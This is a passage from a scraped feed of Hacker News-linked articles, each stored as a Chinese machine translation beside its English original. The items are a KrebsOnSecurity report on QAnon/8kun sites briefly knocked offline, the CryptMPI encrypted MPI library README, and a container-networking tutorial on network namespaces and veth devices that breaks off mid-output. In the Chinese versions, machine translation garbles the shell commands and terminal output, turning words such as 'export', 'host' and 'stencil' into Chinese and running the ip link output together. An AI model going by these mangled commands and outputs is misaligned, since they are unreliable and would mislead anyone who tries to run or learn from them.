Host\u4ee3\u8868VanwaTech\u8def\u7531\u7684254\u4e2a\u4e92\u8054\u7f51\u5730\u5740\u96c6\u63d0\u4f9bDDoS\u4fdd\u62a4\u3002\nKrebsOnSecurity\u8054\u7cfb\u5230\u4e86CNServers\u63a5\u542c\u7535\u8bdd\u7684\u4eba\uff0c\u7531\u4e8e\u62c5\u5fc3\u53ef\u80fd\u906d\u52308kun/Qanon\u4eba\u7fa4\u7684\u62a5\u590d\uff0c\u4ed6\u8981\u6c42\u5728\u8fd9\u7bc7\u62a5\u9053\u4e2d\u4e0d\u5177\u540d\u3002\u4f46\u4ed6\u4eec\u8bc1\u5b9e\uff0cCNServers\u786e\u5b9e\u5df2\u7ecf\u7ec8\u6b62\u4e86\u4e0e\u65af\u5df4\u8fbe\u4e1c\u9053\u4e3b\u7684\u670d\u52a1\u3002\u8fd9\u4f4d\u77e5\u60c5\u4eba\u58eb\u8865\u5145\u8bf4\uff0c\u4ed6\u4eec\u65e2\u4e0d\u662f8kun\u7684\u7c89\u4e1d\uff0c\u4e5f\u4e0d\u662fQAnon\u7684\u7c89\u4e1d\uff0c\u5e76\u8868\u793a\u4ed6\u4eec\u4e0d\u4f1a\u81ea\u79f0\u662f\u7279\u6717\u666e\u7684\u652f\u6301\u8005\u3002\nCNServers\u8868\u793a\uff0c\u5728\u64a4\u56deDDoS\u4fdd\u62a4\u670d\u52a1\u540e\u4e0d\u4e45\uff0cSpartan Host\u6539\u53d8\u4e86\u8bbe\u7f6e\uff0c\u4f7fVanwaTech\u7684\u4e92\u8054\u7f51\u5730\u5740\u514d\u53d7\u4fc4\u7f57\u65af\u5723\u5f7c\u5f97\u5821\u7684DDoS-Guard[.]Net\u516c\u53f8\u7684\u653b\u51fb\u3002\n\u65af\u5df4\u8fbe\u4e3b\u6301\u4eba\u7684\u521b\u59cb\u4eba\uff0c25\u5c81\u7684\u745e\u5b89\u00b7\u9ea6\u5361\u5229\u8bc1\u5b9e\u4e86CNServers\u7684\u62a5\u9053\u3002McCully\u62d2\u7edd\u900f\u9732VanwaTech\u4f5c\u4e3a\u5ba2\u6237\u6709\u591a\u957f\u65f6\u95f4\uff0c\u4e5f\u62d2\u7edd\u900f\u9732Spartan Host\u662f\u5426\u56e0CNServers\u7684\u884c\u52a8\u800c\u906d\u53d7\u8fc7\u4efb\u4f55\u653b\u51fb\u3002\n\u9ea6\u5361\u5229\u8bf4\uff0c\u867d\u7136\u4ed6\u4e2a\u4eba\u5e76\u4e0d\u8ba4\u540cQAnon\u62168kun\u6240\u4fe1\u5949\u7684\u4fe1\u5ff5\uff0c\u4f46\u4ed6\u6253\u7b97\u7ee7\u7eed\u4fdd\u6301\u4e07\u534e\u79d1\u6280\u4f5c\u4e3a\u5ba2\u6237\u7684\u5730\u4f4d\u3002\n\u9ea6\u5361\u5229\u5728\u901a\u8fc7\u5373\u65f6\u6d88\u606f\u8fdb\u884c\u7684\u8c08\u8bdd\u4e2d\u8bf4\uff1a\u201c\u6211\u4eec\u5728\u51b3\u5b9a\u5141\u8bb8\u54ea\u4e9b\u9879\u76ee\u4e0e\u6211\u4eec\u5171\u540c\u6258\u7ba1\u65f6\u9075\u5faa\u2018\u571f\u5730\u6cd5\u5219\u2019\uff0c\u9664\u4e86\u4e00\u4e9b\u53ef\u80fd\u5bfc\u81f4\u8d44\u6e90\u95ee\u9898\u7b49\u7684\u4f8b\u5916\u60c5\u51b5\u3002\u201d\u201c\u4ec5\u4ec5\u56e0\u4e3a\u6211\u4eec\u6258\u7ba1\u4e86\u4e00\u4e9b\u4e1c\u897f\uff0c\u5b83\u5e76\u6ca1\u6709\u8bf4\u660e\u6211\u4eec\u652f\u6301\u548c\u4e0d\u652f\u6301\u4ec0\u4e48\uff0c\u6211\u4eec\u7684\u89c2\u70b9\u4e0d\u4f1a\u5f71\u54cd\u6258\u7ba1\u5185\u5bb9\u7684\u51b3\u7b56\u3002\u201d\n\u4f46\u6839\u636e\u5409\u5c14\u6885\u7279\u7684\u8bf4\u6cd5\uff0c\u65af\u5df4\u8fbe\u4e1c\u9053\u4e3b\u4e0e\u4e07\u74e6\u6cf0\u514b\u7684\u5173\u7cfb\u4ee5\u524d\u5e76\u4e0d\u5e7f\u4e3a\u4eba\u77e5\uff0c\u56e0\u4e3a\u65af\u5df4\u8fbe\u4e1c\u9053\u4e3b\u4e0e\u4e07\u74e6\u6cf0\u514b\u8fbe\u6210\u4e86\u4e00\u9879\u6240\u8c13\u7684\u201c\u79c1\u4eba\u540c\u884c\u201d\u534f\u8bae\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e24\u5bb6\u516c\u53f8\u6709\u4e00\u4e2a\u4fdd\u5bc6\u7684\u4e1a\u52a1\u5b89\u6392\uff0c\u901a\u8fc7\u8fd9\u79cd\u5b89\u6392\uff0c\u4ed6\u4eec\u4e4b\u95f4\u7684\u76f8\u4e92\u8054\u7cfb\u5e76\u4e0d\u660e\u786e\u5730\u8868\u660e\u6216\u5411\u5168\u7403\u4e92\u8054\u7f51\u4e0a\u7684\u5176\u4ed6\u4e92\u8054\u7f51\u63d0\u4f9b\u5546\u663e\u800c\u6613\u89c1\u3002\nGuilmette\u8bf4\uff0c\u5f53\u76f8\u5173\u5404\u65b9\u4e0d\u60f3\u8ba9\u5176\u4ed6\u4efb\u4f55\u4eba\u77e5\u9053\u4ed6\u4eec\u7684\u5173\u7cfb\u65f6\uff0c\u79c1\u4eba\u5bf9\u7b49\u5173\u7cfb\u5f80\u5f80\u5728\u8bb8\u591a\u5e55\u540e\u6076\u4f5c\u5267\u4e2d\u53d1\u6325\u7740\u91cd\u8981\u4f5c\u7528\u3002\n\u201c\u8fd9\u4e9b\u5b89\u6392\u662f\u53cc\u65b9\u4e4b\u95f4\u4fdd\u5bc6\u7684\u5546\u4e1a\u534f\u8bae\uff0c\u6ca1\u6709\u4eba\u77e5\u9053\uff0c\u9664\u975e\u4f60\u5f00\u59cb\u63d0\u95ee\uff0c\u201dGuilmette\u8bf4\u3002\u201c\u663e\u7136\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f7f\u7528\u4e86\u79c1\u4eba\u5bf9\u7b49\u5b89\u6392\uff0c\u4ee5\u9690\u85cfSpartan Host\u76f4\u63a5\u53c2\u4e0e\u63d0\u4f9b\u5230VanwaTech\u7684\u8fde\u63a5\uff0c\u4ece\u800c\u63d0\u4f9b\u52308kun\u7684\u8fde\u63a5\u3002\u6216\u8bb8\u9ea6\u5361\u5229\u5148\u751f\u5e76\u4e0d\u6025\u4e8e\u8ba9\u4eba\u77e5\u9053\u4ed6\u7684\u53c2\u4e0e\u3002\u201c\u3002\n8chan\u53bb\u5e74\u66f4\u540d\u4e3a8kun\uff0c\u4e0e\u767d\u4eba\u81f3\u4e0a\u4e3b\u4e49\u3001\u65b0\u7eb3\u7cb9\u4e3b\u4e49\u3001\u53cd\u72b9\u592a\u4e3b\u4e49\u3001\u591a\u8d77\u5927\u89c4\u6a21\u67aa\u51fb\u4e8b\u4ef6\u6709\u5173\uff0c\u5e76\u4ee5\u6258\u7ba1\u513f\u7ae5\u8272\u60c5\u4f5c\u54c1\u800c\u95fb\u540d\u30022019\u5e74\u53d1\u751f\u7684\u4e09\u8d77\u5927\u89c4\u6a21\u67aa\u51fb\u4e8b\u4ef6\u663e\u793a\uff0c\u8087\u4e8b\u8005\u57288chan\u4e0a\u4f20\u64ad\u4e86\u4ed6\u4eec\u7684\u5ba3\u8a00\uff0c\u751a\u81f3\u5728\u90a3\u91cc\u76f4\u64ad\u4e86\u4ed6\u4eec\u7684\u6740\u622e\uff0c8chan\u906d\u5230\u4e86\u4e00\u4e2a\u53c8\u4e00\u4e2a\u4e92\u8054\u7f51\u63d0\u4f9b\u5546\u7684\u6392\u65a5\u3002\n\u7f8e\u56fd\u8054\u90a6\u8c03\u67e5\u5c40(FBI)\u53bb\u5e74\u5c06QAnon\u8ba4\u5b9a\u4e3a\u6f5c\u5728\u7684\u56fd\u5185\u6050\u6016\u5a01\u80c1\uff0c\u5e76\u6307\u51fa\u5176\u4e00\u4e9b\u8ffd\u968f\u8005\u4e0e\u8fb9\u7f18\u4fe1\u4ef0\u9a71\u4f7f\u7684\u66b4\u529b\u4e8b\u4ef6\u6709\u5173\u3002", "note_en": "A phone call to an Internet provider in Oregon on Sunday evening was all it took to briefly sideline multiple websites related to  8chan/8kun \u2014 a controversial online image board linked to several mass shootings \u2014 and  QAnon, the far-right conspiracy theory which holds that a cabal of Satanic pedophiles is running a global child sex-trafficking ring and plotting against  President Donald Trump. Following a brief disruption, the sites have come back online with the help of an Internet company based in St. Petersburg, Russia.\n  A large number of 8kun and QAnon-related sites (see map above) are connected to the Web via a single Internet provider in Vancouver, Wash. called  VanwaTech (a.k.a. \u201c OrcaTech\u201c). Previous appeals to VanwaTech to disconnect these sites have fallen on deaf ears, as the company\u2019s owner  Nick Lim  reportedly has been working with 8kun\u2019s administrators to keep the sites online in the name of protecting free speech.\n But VanwaTech also had a single point of failure on its end: The swath of Internet addresses serving the various 8kun/QAnon sites were being protected from otherwise crippling and incessant distributed-denial-of-service (DDoS) attacks by Hillsboro, Ore. based  CNServers LLC.\n On Sunday evening, security researcher  Ron Guilmette placed a phone call to CNServers\u2019 owner, who professed to be shocked by revelations that his company was helping QAnon and 8kun keep the lights on.\n Within minutes of that call, CNServers told its customer \u2014  Spartan Host Ltd., which is registered in Belfast, Northern Ireland \u2014 that it would no longer be providing DDoS protection for the set of 254 Internet addresses that Spartan Host was routing on behalf of VanwaTech.\n Contacted by KrebsOnSecurity, the person who answered the phone at CNServers asked not to be named in this story for fear of possible reprisals from the 8kun/QAnon crowd. But they confirmed that CNServers had indeed terminated its service with Spartan Host. That person added they weren\u2019t a fan of either 8kun or QAnon, and said they would not self-describe as a Trump supporter.\n CNServers said that shortly after it withdrew its DDoS protection services, Spartan Host changed its settings so that VanwaTech\u2019s Internet addresses were protected from attacks by  ddos-guard[.]net, a company based in St. Petersburg, Russia.\n Spartan Host\u2019s founder, 25-year-old  Ryan McCully, confirmed CNServers\u2019 report. McCully declined to say for how long VanwaTech had been a customer, or whether Spartan Host had experienced any attacks as a result of CNServers\u2019 action.\n McCully said while he personally doesn\u2019t subscribe to the beliefs espoused by QAnon or 8kun, he intends to keep VanwaTech as a customer going forward.\n \u201cWe follow the \u2018law of the land\u2019 when deciding what we allow to be hosted with us, with some exceptions to things that may cause resource issues etc.,\u201d McCully said in a conversation over instant message. \u201cJust because we host something, it doesn\u2019t say anything about we do and don\u2019t support, our opinions don\u2019t come into hosted content decisions.\u201d\n But according to Guilmette, Spartan Host\u2019s relationship with VanwaTech wasn\u2019t widely known previously because Spartan Host had set up what\u2019s known as a \u201cprivate peering\u201d agreement with VanwaTech. That is to say, the two companies had a confidential business arrangement by which their mutual connections were not explicitly stated or obvious to other Internet providers on the global Internet.\n Guilmette said private peering relationships often play a significant role in a good deal of behind-the-scenes-mischief when the parties involved do not want anyone else to know about their relationship.\n \u201cThese arrangements are business agreements that are confidential between two parties, and no one knows about them, unless you start asking questions,\u201d Guilmette said. \u201cIt certainly appears that a private peering arrangement was used in this instance in order to hide the direct involvement of Spartan Host in providing connectivity to VanwaTech and thus to 8kun. Perhaps Mr. McCully was not eager to have his involvement known.\u201d\n 8chan, which rebranded last year as 8kun, has been linked to white supremacism, neo-Nazism, antisemitism, multiple mass shootings, and is known for hosting child pornography. After three mass shootings in 2019 revealed the perpetrators had spread their manifestos on 8chan and even streamed their killings live there, 8chan was ostracized by one Internet provider after another.\n The FBI last year identified QAnon as  a potential domestic terror threat, noting that some of its followers have been linked to violent incidents motivated by fringe beliefs.", "posttime": "2020-10-19 13:51:54", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "chan,sites,qanon", "title": "QAnon/8Chan\u7f51\u7ad9\u77ed\u6682\u4e0b\u7ebf", "title_en": "QAnon/8Chan Sites Briefly Knocked Offline", "transed": 1, "url": "https://krebsonsecurity.com/2020/10/qanon-8chan-sites-briefly-knocked-offline/", "via": "", "real_tags": ["chan", "sites", "qanon"]}, {"category": "", "categoryclass": "", "imagename": "c06c7777ad871409d31170f530b414da.jpeg", "infoid": 1029709, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "CryptMPI\u5728HPC\u96c6\u7fa4\u548c\u4e91\u73af\u5883\u4e2d\u63d0\u4f9b\u5b89\u5168\u7684\u8282\u70b9\u95f4\u901a\u4fe1\uff0c\u6211\u4eec\u5728MPICH-3.2.1(\u7528\u4e8e\u4ee5\u592a\u7f51)\u548cMVAPICH2-2.3.1(\u7528\u4e8eInfiniband)\u4e2d\u5b9e\u73b0\u4e86\u4e24\u4e2a\u539f\u578b\uff0c\u8fd9\u4e24\u4e2a\u539f\u578b\u90fd\u4f7f\u7528BoringSSL\u5e93\u4e2d\u7684AES-GCM\u3002\n\u5bfc\u51faLD_LIBRARY_PATH=/MVAPICH_INSTALL_DIR/install/lib:/YOUR_PATH_TO_MVAPICH/mvapich2-2.3.2/boringssl-master/build/crypto EXPORT MV2_ENABLE_AFFINITY=1 EXPORT MV2_CPU_BINDING_POLICY=\u6df7\u5408\u5bfc\u51faMV2_HIXED_BINDING_POLICY=\u6269\u6563/MVAPICH_INSTALL_DIR/INSTALL/mpiexec-n 2-f\u4e3b\u673a./pingpong/MVAPICH_INSTALL_DIR/install/mpiexec-n 64-f\u4e3b\u673a\u3002/\u6a21\u51778 8 128 128 2 1000 0\u3002\n\u5bfc\u51faLD_LIBRARY_PATH=/MPICH_INSTALL_DIR/install/lib:/YOUR_PATH_TO_MPICH/mpich-3.2.1/boringssl-master/build/crypto/MPICH_INSTALL_DIR/install/mpiexec-n 2-f\u4e3b\u673a\u3002/pingpong/MPICH_INSTALL_DIR/INSTALL/mpiexec-n 64-f\u4e3b\u673a\u3002/\u6a21\u51778 8 128 128 2 1000 0", "note_en": "CryptMPI provides secure inter-node communication in the HPC cluster and cloud environment.We implemented two prototypes in MPICH-3.2.1 (for Ethernet) and MVAPICH2-2.3.1 (for Infiniband), both using AES-GCM from the  BoringSSL library.\n                         export LD_LIBRARY_PATH=/MVAPICH_INSTALL_DIR/install/lib:/YOUR_PATH_TO_MVAPICH/mvapich2-2.3.2/boringssl-master/build/crypto export MV2_ENABLE_AFFINITY=1 export MV2_CPU_BINDING_POLICY=hybrid export MV2_HYBRID_BINDING_POLICY=spread /MVAPICH_INSTALL_DIR/install/mpiexec -n 2 -f host ./pingpong/MVAPICH_INSTALL_DIR/install/mpiexec -n 64 -f host ./stencil 8 8 128 128 2 1000 0\n  export LD_LIBRARY_PATH=/MPICH_INSTALL_DIR/install/lib:/YOUR_PATH_TO_MPICH/mpich-3.2.1/boringssl-master/build/crypto/MPICH_INSTALL_DIR/install/mpiexec -n 2 -f host ./pingpong/MPICH_INSTALL_DIR/install/mpiexec -n 64 -f host ./stencil 8 8 128 128 2 1000 0", "posttime": "2020-10-19 13:51:41", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "mpi,fast,mpich", "title": "CryptMPI\uff1a\u4e00\u79cd\u5feb\u901f\u52a0\u5bc6\u7684MPI\u5e93", "title_en": "CryptMPI: A Fast Encrypted MPI Library", "transed": 1, "url": "https://github.com/abu-naser/CryptMPI-A-Fast-Encrypted-MPI-Library#cryptmpi-a-fast-encrypted-mpi-library", "via": "", "real_tags": ["mpi", "fast", "mpich"]}, {"category": "", "categoryclass": "", "imagename": "feac9d6ff480a2766e92f8183b1499f8.png", "infoid": 1029708, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4f7f\u7528\u5bb9\u5668\u603b\u662f\u8ba9\u4eba\u611f\u89c9\u5f88\u795e\u5947\u3002\u5bf9\u4e8e\u90a3\u4e9b\u4e86\u89e3\u5185\u90e8\u7ed3\u6784\u7684\u4eba\u6765\u8bf4\uff0c\u8fd9\u662f\u4e00\u79cd\u597d\u65b9\u6cd5\uff0c\u5bf9\u4e8e\u90a3\u4e9b\u4e0d\u4e86\u89e3\u5185\u90e8\u7ed3\u6784\u7684\u4eba\u6765\u8bf4\uff0c\u8fd9\u662f\u4e00\u79cd\u53ef\u6015\u7684\u65b9\u5f0f\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u5df2\u7ecf\u7814\u7a76\u4e86\u5bb9\u5668\u6280\u672f\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\uff0c\u751a\u81f3\u8bbe\u6cd5\u53d1\u73b0\u5bb9\u5668\u53ea\u662f\u5b64\u7acb\u7684\u548c\u53d7\u9650\u7684Linux\u8fdb\u7a0b\uff0c\u8fd9\u4e9b\u6620\u50cf\u5e76\u4e0d\u771f\u7684\u9700\u8981\u8fd0\u884c\u5bb9\u5668\uff0c\u76f8\u53cd\uff0c\u8981\u6784\u5efa\u4e00\u4e2a\u6620\u50cf\uff0c\u6211\u4eec\u9700\u8981\u8fd0\u884c\u4e00\u4e9b\u5bb9\u5668\u3002\n\u73b0\u5728\u662f\u89e3\u51b3\u96c6\u88c5\u7bb1\u8054\u7f51\u95ee\u9898\u7684\u65f6\u5019\u4e86\u3002\u6216\u8005\uff0c\u66f4\u51c6\u786e\u5730\u8bf4\uff0c\u662f\u5355\u4e3b\u673a\u5bb9\u5668\u8054\u7f51\u95ee\u9898\u3002\u5728\u672c\u6587\u4e2d\uff0c\u6211\u4eec\u5c06\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a\n\u5982\u4f55\u865a\u62df\u5316\u7f51\u7edc\u8d44\u6e90\uff0c\u8ba9\u5bb9\u5668\u8ba4\u4e3a\u6bcf\u4e2a\u8d44\u6e90\u90fd\u6709\u4e00\u4e2a\u4e13\u7528\u7684\u7f51\u7edc\u5806\u6808\uff1f\n\u5982\u4f55\u628a\u96c6\u88c5\u7bb1\u53d8\u6210\u53cb\u597d\u7684\u90bb\u5c45\uff0c\u4e0d\u8ba9\u4ed6\u4eec\u5e72\u6270\uff0c\u6559\u4f1a\u4ed6\u4eec\u597d\u597d\u6c9f\u901a\uff1f\n\u5982\u4f55\u4ece\u5916\u90e8\u4e16\u754c\u5230\u8fbe\u8fd0\u884c\u5728\u673a\u5668\u4e0a\u7684\u5bb9\u5668(\u4e5f\u79f0\u4e3a\u7aef\u53e3\u53d1\u5e03)\uff1f\n\u56e0\u6b64\uff0c\u5355\u4e3b\u673a\u5bb9\u5668\u7f51\u7edc\u53ea\u4e0d\u8fc7\u662f\u8457\u540d\u7684Linux\u8bbe\u65bd\u7684\u7b80\u5355\u7ec4\u5408\uff0c\u8fd9\u4e00\u70b9\u5c06\u53d8\u5f97\u663e\u800c\u6613\u89c1\uff1a\n\u4e0d\u7ba1\u662f\u597d\u662f\u574f\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u4ee3\u7801\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7f51\u7edc\u9b54\u672f\u2026\u2026\u3002\n\u4efb\u4f55\u50cf\u6837\u7684Linux\u53d1\u884c\u7248\u53ef\u80fd\u5c31\u8db3\u591f\u4e86\u3002\u672c\u6587\u4e2d\u7684\u6240\u6709\u793a\u4f8b\u90fd\u662f\u5728\u5168\u65b0\u7684\u6d41\u6d6aCentOS 8\u865a\u62df\u673a\u4e0a\u5b9e\u73b0\u7684\uff1a\n\u4e3a\u7b80\u5355\u8d77\u89c1\uff0c\u5728\u672c\u6587\u4e2d\uff0c\u6211\u4eec\u4e0d\u4f1a\u4f9d\u8d56\u4efb\u4f55\u6210\u719f\u7684\u96c6\u88c5\u7bb1\u5316\u89e3\u51b3\u65b9\u6848(\u4f8b\u5982\uff0cdocker\u6216podman)\u3002\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\uff0c\u6211\u4eec\u5c06\u4e13\u6ce8\u4e8e\u57fa\u672c\u6982\u5ff5\uff0c\u5e76\u4f7f\u7528\u6700\u57fa\u672c\u7684\u5de5\u5177\u6765\u5b9e\u73b0\u6211\u4eec\u7684\u5b66\u4e60\u76ee\u6807\u3002\nLinux\u7f51\u7edc\u5806\u6808\u7531\u4ec0\u4e48\u7ec4\u6210\uff1f\u5f88\u660e\u663e\uff0c\u8fd9\u5957\u7f51\u7edc\u8bbe\u5907\u3002\u8fd8\u6709\u4ec0\u4e48\uff1f\u53ef\u80fd\u662f\u8def\u7531\u89c4\u5219\u96c6\u3002\u4e0d\u8981\u5fd8\u8bb0\uff0c\u5305\u62ec\u7531iptables\u89c4\u5219\u5b9a\u4e49\u7684netfilter\u94a9\u5b50\u96c6\u3002\n#\uff01/usr/bin/env bashecho&#34\uff1b&gt\uff1b\u7f51\u7edc\u8bbe\u5907&#34\uff1bIP linkecho-e&34\uff1b\\n&gt\uff1b\u8def\u7531\u8868&#34\uff1bIP routeecho-e&#34\uff1b\\n&gt\uff1biptables\u89c4\u5219&#34\uff1biptables--list-\u89c4\u5219\u3002\n$sudo./Inspect-Net-Stack.sh&gt\uff1b\u7f51\u7edc\u8bbe\u59071\uff1alo\uff1a&lt\uff1bloopback\uff0cup\uff0clow_up&gt\uff1bmtu 65536 qdisk\u65e0\u961f\u5217\u72b6\u6001\u672a\u77e5\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000\u94fe\u8def/\u73af\u56de00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a002\uff1aeth0\uff1a&lt\uff1b\u5e7f\u64ad\uff0c\u7ec4\u64ad\uff0c\u4e0a\u4f20\uff0c\u964d\u4f4e_\u4e0a\u4f20&gt\uff1bMTU 1500 qdisk fq_codel state up mode\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000 link/ether 52\uff1a54\uff1a00\uff1ae3\uff1a27\uff1a77 brd ff\uff1aff&gt\uff1b\u8def\u7531\u8868\u9ed8\u8ba4\u901a\u8fc710.0.2.2 dev eth0 proto dhcp\u6307\u680710010.0.2.0/24 dev eth0 proto kernel\u4f5c\u7528\u57df\u94fe\u8defsrc 10.0.2.15\u6307\u6807100&gt\uff1biptables\u89c4\u5219-P\u8f93\u5165\u63a5\u53d7-P\u8f6c\u53d1\u63a5\u53d7-P\u8f93\u51fa\u63a5\u53d7-N ROOT_NS\u3002\n\u6211\u4eec\u5bf9\u8be5\u8f93\u51fa\u5f88\u611f\u5174\u8da3\uff0c\u56e0\u4e3a\u6211\u4eec\u5e0c\u671b\u786e\u4fdd\u5373\u5c06\u521b\u5efa\u7684\u6bcf\u4e2a\u5bb9\u5668\u90fd\u5c06\u83b7\u5f97\u5355\u72ec\u7684\u7f51\u7edc\u5806\u6808\u3002\n\u60a8\u53ef\u80fd\u5df2\u7ecf\u542c\u8bf4\u8fc7\uff0c\u7528\u4e8e\u5bb9\u5668\u9694\u79bb\u7684Linux\u540d\u79f0\u7a7a\u95f4\u4e4b\u4e00\u79f0\u4e3a\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4\u3002\u5728MAN IP\u7f51\u7edc\u4e2d\uff0c\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4\u5728\u903b\u8f91\u4e0a\u662f\u7f51\u7edc\u5806\u6808\u7684\u53e6\u4e00\u4e2a\u526f\u672c\uff0c\u5177\u6709\u81ea\u5df1\u7684\u8def\u7531\u3001\u9632\u706b\u5899\u89c4\u5219\u548c\u7f51\u7edc\u8bbe\u5907\u3002\u4e3a\u7b80\u5355\u8d77\u89c1\uff0c\u8fd9\u662f\u6211\u4eec\u5728\u672c\u6587\u4e2d\u8981\u4f7f\u7528\u7684\u552f\u4e00\u540d\u79f0\u7a7a\u95f4\u3002\u4e0e\u5176\u521b\u5efa\u5b8c\u5168\u9694\u79bb\u7684\u5bb9\u5668\uff0c\u6211\u4eec\u5b81\u613f\u5c06\u8303\u56f4\u4ec5\u9650\u4e8e\u7f51\u7edc\u5806\u6808\u3002\n\u521b\u5efa\u7f51\u7edc\u547d\u540d\u7a7a\u95f4\u7684\u65b9\u6cd5\u4e4b\u4e00\u662fIP\u5de5\u5177\uff0c\u5b83\u662f\u4e8b\u5b9e\u4e0a\u7684\u6807\u51c6iproute2\u96c6\u5408\u7684\u4e00\u90e8\u5206\uff1a\n\u5982\u4f55\u5f00\u59cb\u4f7f\u7528\u521a\u521a\u521b\u5efa\u7684\u547d\u540d\u7a7a\u95f4\uff1f\u6709\u4e00\u4e2a\u53ef\u7231\u7684Linux\u547d\u4ee4\uff0c\u540d\u4e3ansenter\u3002\u5b83\u8fdb\u5165\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u5b9a\u7684\u547d\u540d\u7a7a\u95f4\uff0c\u7136\u540e\u6267\u884c\u7ed9\u5b9a\u7684\u7a0b\u5e8f\uff1a\n$sudo nsenter--net=/var/run/netns/netns0 bash#\u65b0\u521b\u5efa\u7684bash\u8fdb\u7a0b\u4f4d\u4e8enetns0$sudo\u4e2d\u3002/check-net-stack.sh&gt\uff1b\u7f51\u7edc\u8bbe\u59071\uff1aLO\uff1a&lt\uff1bloopback&gt\uff1bmtu 65536 qdisk noop state down\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000\u94fe\u8def/\u73af\u56de00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a00 brd 00\uff1a00\uff1a00\uff1a00\uff1a00&gt\uff1b\u8def\u7531\u8868&gt\uff1biptables\u89c4\u5219-P\u8f93\u5165\u63a5\u53d7-P\u8f6c\u53d1\u63a5\u53d7-P\u8f93\u51fa\u63a5\u53d7\u3002\n\u4ece\u4e0a\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u6e05\u695a\u5730\u770b\u51fa\uff0c\u5728netns0\u540d\u79f0\u7a7a\u95f4\u5185\u8fd0\u884c\u7684bash\u8fdb\u7a0b\u770b\u5230\u4e86\u4e00\u4e2a\u5b8c\u5168\u4e0d\u540c\u7684\u7f51\u7edc\u5806\u6808\u3002\u6839\u672c\u6ca1\u6709\u8def\u7531\u89c4\u5219\uff0c\u6ca1\u6709\u81ea\u5b9a\u4e49\u7684iptables\u94fe\uff0c\u53ea\u6709\u4e00\u53f0\u73af\u56de\u7f51\u7edc\u8bbe\u5907\u3002\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u4e00\u5207\u90fd\u5f88\u597d..\u3002\n\u5982\u679c\u6211\u4eec\u4e0d\u80fd\u4e0e\u4e13\u7528\u7f51\u7edc\u5806\u6808\u901a\u4fe1\uff0c\u90a3\u4e48\u5b83\u5c31\u6ca1\u6709\u591a\u5927\u7528\u5904\u3002\u5e78\u8fd0\u7684\u662f\uff0cLinux\u4e3a\u6b64\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5408\u9002\u7684\u5de5\u5177-\u865a\u62df\u4ee5\u592a\u7f51\u8bbe\u5907\uff01\u4eceman Veth\u6765\u770b\uff0cVeth\u8bbe\u5907\u662f\u865a\u62df\u4ee5\u592a\u7f51\u8bbe\u5907\u3002\u5b83\u4eec\u53ef\u4ee5\u5145\u5f53\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4\u4e4b\u95f4\u7684\u96a7\u9053\uff0c\u4ee5\u521b\u5efa\u5230\u53e6\u4e00\u4e2a\u540d\u79f0\u7a7a\u95f4\u4e2d\u7684\u7269\u7406\u7f51\u7edc\u8bbe\u5907\u7684\u6865\uff0c\u4f46\u4e5f\u53ef\u4ee5\u7528\u4f5c\u72ec\u7acb\u7684\u7f51\u7edc\u8bbe\u5907\u3002\n\u865a\u62df\u4ee5\u592a\u7f51\u8bbe\u5907\u59cb\u7ec8\u6210\u5bf9\u8fd0\u884c\u3002\u522b\u62c5\u5fc3\uff0c\u5f53\u6211\u4eec\u770b\u4e00\u4e0b\u521b\u5efa\u547d\u4ee4\u65f6\u5c31\u4f1a\u660e\u767d\u4e86\uff1a\n\u4f7f\u7528\u8fd9\u4e2a\u547d\u4ee4\uff0c\u6211\u4eec\u521a\u521a\u521b\u5efa\u4e86\u4e00\u5bf9\u4e92\u8fde\u7684\u865a\u62df\u4ee5\u592a\u7f51\u8bbe\u5907\u3002\u540d\u79f0veth0\u548cceth0\u662f\u4efb\u610f\u9009\u62e9\u7684\uff1a\n$IP link1\uff1aLO\uff1a&lt\uff1bLOOPBACK\uff0cUP\uff0cLOWER_UP&gt\uff1bMTU 65536 qdisk\u65e0\u961f\u5217\u72b6\u6001\u672a\u77e5\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000 link/loopback 00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a002\uff1aeth0\uff1a&lt\uff1b\u5e7f\u64ad\uff0c\u591a\u64ad\uff0cUp\uff0cLOWER_UP&gt\uff1bMTU 1500 qdisk fq_codel\u72b6\u6001Up\u6a21\u5f0f\u9ed8\u8ba4\u7ec4default qlen 1000 link/ether 52\uff1a54\uff1a00\uff1ae3\uff1a27\uff1a77 brdff\uff1aff5\uff1aceth0@veth0\uff1a&lt\uff1b\u5e7f\u64ad\uff0c\u591a\u64ad\uff0cM-DOWN&&gt;MTU 1500 qdisk noop\u72b6\u6001\u5173\u95ed\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000\u94fe\u8def/\u4ee5\u592a66\uff1a2D\uff1a24\uff1ae3\uff1a49\uff1a3f BRD ff\uff1aff6\uff1aveth0@ceth0\uff1a&lt\uff1b\u5e7f\u64ad\uff0c\u591a\u64ad\uff0cM-down&gt\uff1bMTU 1500 qdisk 